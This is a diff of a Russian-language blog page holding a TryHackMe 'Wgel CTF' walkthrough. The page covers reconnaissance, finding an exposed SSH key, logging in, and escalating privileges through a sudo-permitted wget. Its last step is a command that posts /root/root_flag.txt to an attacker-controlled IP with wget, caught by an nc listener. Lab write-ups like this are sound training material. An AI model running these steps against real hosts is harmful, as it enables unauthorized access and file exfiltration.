@@ -1,69 +1,90 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 fill=%22black%22/><path d=%22M20 30 H80 V60 H70 V70 H60 V60 H40 V70 H30 V60 H20 Z M35 40 H45 V50 H35 Z M55 40 H65 V50 H55 Z M45 55 H55 V60 H45 Z%22 fill=%22%2300ffcc%22/></svg>">
-    <title>Wgel CTF | Dr@ng3</title>
-    <link rel="stylesheet" href="/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Wgel CTF | Dr@ng3</title>
+<meta name="description" content="Разбор машины уровня Easy. Учимся находить скрытые файлы и использовать Wget для эксфильтрации данных.">
+<meta name="theme-color" content="#04050c">
+<meta property="og:title" content="Wgel CTF | Dr@ng3">
+<meta property="og:description" content="Разбор машины уровня Easy. Учимся находить скрытые файлы и использовать Wget для эксфильтрации данных.">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="favicon.png" type="image/png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&amp;family=Play:wght@400;700&amp;display=swap">
+<link rel="stylesheet" href="style.css">
+<script>try{var t=localStorage.getItem('drang3-theme');if(t)document.documentElement.dataset.theme=t}catch(e){}</script>
 </head>
 <body>
-    <canvas id="matrix"></canvas>
-    <div class="container">
-        <header>
-            <div class="logo">>_ Dr@ng3</div>
-            <nav>
-                <a href="/index.html">Home</a>
-                <a href="/writeups.html" class="active">Writeups</a>
-                <a href="/about.html">About</a>
-            </nav>
-        </header>
+<a class="skip" href="#main">К содержимому</a>
+<header class="site"><div class="wrap bar">
+  <a class="logo" href="index.html" aria-label="Dr@ng3, главная"><span class="pr">&gt;_</span> Dr@ng3</a>
+  <nav class="main" aria-label="Основная">
+    <a href="index.html">Home</a>
+    <a href="writeups.html" aria-current="page">Writeups</a>
+    <a href="about.html">About</a>
+  </nav>
+  <button class="theme-btn" id="themeBtn" type="button" aria-label="Сменить цвет интерфейса" title="Сменить цвет"><span></span></button>
+</div></header>
+<div id="progress" aria-hidden="true"></div>
+<main id="main" class="wrap">
+  <div class="post-grid">
+    <article class="post">
+      <a class="back" href="writeups.html">&lt; Все райтапы</a>
+      <h1 class="post-title neon-text">Wgel CTF</h1>
+      <div class="post-meta">
+        <span class="badge">TryHackMe</span>
+        <time datetime="2026-11-05">5 ноября 2026</time>
+        
+        <span id="rt"></span>
+        <ul class="tags"><li class="t-web">#web</li><li class="t-linux">#linux</li><li class="t-privesc">#privesc</li></ul>
+      </div>
+      <div class="post-content">
 
-        <article class="post-container">
-            <h1 class="post-title">Wgel CTF</h1>
-            <div class="post-meta">TryHackMe | #web #linux #privesc | Nov 05, 2026</div>
-            
-            <div class="post-content">
-                <p>Это разбор комнаты <strong>Wgel CTF</strong> с платформы TryHackMe. Цель — получить пользовательский и корневой флаги. Машина уровня Easy.</p>
-
-                <h2>1. Разведка</h2>
-                <p>Сканируем целевой хост с помощью Nmap, чтобы найти открытые порты.</p>
+<p>Это разбор комнаты <strong>Wgel CTF</strong> с платформы TryHackMe. Цель — получить пользовательский и корневой флаги. Машина уровня Easy.</p>
+<h2>1. Разведка</h2>
+<p>Сканируем целевой хост с помощью Nmap, чтобы найти открытые порты.</p>
 <pre><code>nmap -sC -sV -Pn -p 22,80 10.113.135.112</code></pre>
-                <p>Находим два открытых порта: <code>22 (SSH)</code> и <code>80 (HTTP)</code>. На 80-м порту работает веб-сервер Apache с дефолтной страницей "It works!".</p>
-
-                <h2>2. Поиск скрытых директорий</h2>
-                <p>Так как на главной странице ничего нет, мы смотрим её исходный код. В браузере нажимаем <code>Ctrl+U</code> и ищем комментарии. В самом низу HTML-кода находим строчку: <code>&lt;!-- Jessie don't forget to update the website --&gt;</code>. Из неё мы узнаем имя пользователя: <strong>jessie</strong>.</p>
-                <p>Далее запускаем <code>gobuster</code> (утилита для брутфорса директорий), чтобы найти скрытые папки:</p>
+<p>Находим два открытых порта: <code>22 (SSH)</code> и <code>80 (HTTP)</code>. На 80-м порту работает веб-сервер Apache с дефолтной страницей "It works!".</p>
+<h2>2. Поиск скрытых директорий</h2>
+<p>Так как на главной странице ничего нет, мы смотрим её исходный код. В браузере нажимаем <code>Ctrl+U</code> и ищем комментарии. В самом низу HTML-кода находим строчку: <code>&lt;!-- Jessie don't forget to update the website --&gt;</code>. Из неё мы узнаем имя пользователя: <strong>jessie</strong>.</p>
+<p>Далее запускаем <code>gobuster</code> (утилита для брутфорса директорий), чтобы найти скрытые папки:</p>
 <pre><code>gobuster dir -u http://10.113.135.112 -w /usr/share/wordlists/dirb/common.txt</code></pre>
-                <p>Находим папку <code>/sitemap/</code>. Запускаем брутфорс уже внутри неё:</p>
+<p>Находим папку <code>/sitemap/</code>. Запускаем брутфорс уже внутри неё:</p>
 <pre><code>gobuster dir -u http://10.113.135.112/sitemap/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
-                <p>Находим папку <code>/.ssh</code>. Это большая ошибка разработчика — хранить ключи в открытом доступе.</p>
-
-                <h2>3. Вход по SSH</h2>
-                <p>Скачиваем приватный ключ из папки <code>/.ssh</code> и даем ему правильные права (иначе SSH не пустит):</p>
+<p>Находим папку <code>/.ssh</code>. Это большая ошибка разработчика — хранить ключи в открытом доступе.</p>
+<h2>3. Вход по SSH</h2>
+<p>Скачиваем приватный ключ из папки <code>/.ssh</code> и даем ему правильные права (иначе SSH не пустит):</p>
 <pre><code>curl http://10.113.135.112/sitemap/.ssh/id_rsa -o id_rsa
 chmod 600 id_rsa</code></pre>
-                <p>Подключаемся к машине:</p>
+<p>Подключаемся к машине:</p>
 <pre><code>ssh -i id_rsa jessie@10.113.135.112</code></pre>
-                <p>Мы внутри. Пользовательский флаг обычно лежит в документах. Читаем его:</p>
+<p>Мы внутри. Пользовательский флаг обычно лежит в документах. Читаем его:</p>
 <pre><code>cat /home/jessie/Documents/user_flag.txt</code></pre>
-                <p><strong>Флаг пользователя:</strong> <censored>YouWannaKeyHere??</censored></p>
-
-                <h2>4. Эскалация привилегий</h2>
-                <p>Нам нужно стать root. Проверяем, какие команды разрешено запускать пользователю <code>jessie</code> от имени суперпользователя:</p>
+<p><strong>Флаг пользователя:</strong> <span aria-label="Флаг скрыт" class="redacted" role="img">█████████████████</span></p>
+<h2>4. Эскалация привилегий</h2>
+<p>Нам нужно стать root. Проверяем, какие команды разрешено запускать пользователю <code>jessie</code> от имени суперпользователя:</p>
 <pre><code>sudo -l</code></pre>
-                <p>Видим строку: <code>(root) NOPASSWD: /usr/bin/wget</code>. Это значит, что мы можем запускать утилиту <code>wget</code> (которая качает файлы из интернета) с правами <strong>root</strong>, и система не спросит пароль.</p>
-                <p>В CTF-комнатах корневой флаг почти всегда лежит в файле <code>/root/root_flag.txt</code>. Обычный пользователь туда зайти не может, но <code>wget</code> запущенный через <code>sudo</code> — может.</p>
-                <p>Мы используем функцию <code>--post-file</code> у <code>wget</code>, чтобы заставить его отправить файл на наш IP. Сначала на нашей машине (AttackBox) включаем прослушивание порта:</p>
+<p>Видим строку: <code>(root) NOPASSWD: /usr/bin/wget</code>. Это значит, что мы можем запускать утилиту <code>wget</code> (которая качает файлы из интернета) с правами <strong>root</strong>, и система не спросит пароль.</p>
+<p>В CTF-комнатах корневой флаг почти всегда лежит в файле <code>/root/root_flag.txt</code>. Обычный пользователь туда зайти не может, но <code>wget</code> запущенный через <code>sudo</code> — может.</p>
+<p>Мы используем функцию <code>--post-file</code> у <code>wget</code>, чтобы заставить его отправить файл на наш IP. Сначала на нашей машине (AttackBox) включаем прослушивание порта:</p>
 <pre><code>nc -lvnp 4444</code></pre>
-                <p>Затем на машине жертвы выполняем команду для кражи файла:</p>
+<p>Затем на машине жертвы выполняем команду для кражи файла:</p>
 <pre><code>sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.113.180.235:4444/</code></pre>
-                <p>В терминале с <code>nc</code> мы видим HTTP-запрос, внутри которого спрятан флаг.</p>
-                <p><strong>Корневой флаг:</strong> <censored>Ahahaha..Noo!YouNeedSoloveIt!</censored></p>
-            </div>
-        </article>
-    </div>
-    <script src="/script.js"></script>
+<p>В терминале с <code>nc</code> мы видим HTTP-запрос, внутри которого спрятан флаг.</p>
+<p><strong>Корневой флаг:</strong> <span aria-label="Флаг скрыт" class="redacted" role="img">████████████████████████████</span></p>
+
+      </div>
+      <nav class="pager" aria-label="Другие райтапы"><div class="frame next"><div><a href="hkcert-2026.html"><small>Позже &gt;</small>HKCERT CTF 2026: 401 Unauthorized</a></div></div></nav>
+    </article>
+    <aside class="toc" aria-label="Содержание"><details open><summary>Содержание</summary><ol id="toc"></ol></details></aside>
+  </div>
+</main>
+<footer class="site"><div class="wrap">
+  <span>Dr@ng3 // Cyber Range &copy; 2026</span>
+  <ul><li><a href="https://github.com/Drang3" target=_blank rel="noopener noreferrer">GitHub</a></li><li><a href="https://tryhackme.com/p/Drang3" target=_blank rel="noopener noreferrer">TryHackMe</a></li><li><a href="https://profile.hackthebox.com/profile/01a1a224-58e1-7096-b485-9b931cf62163" target=_blank rel="noopener noreferrer">HackTheBox</a></li><li><a href="mailto:drangexrr@gmail.com">Email</a></li></ul>
+</div></footer>
+<script src="script.js"></script>
 </body>
 </html>
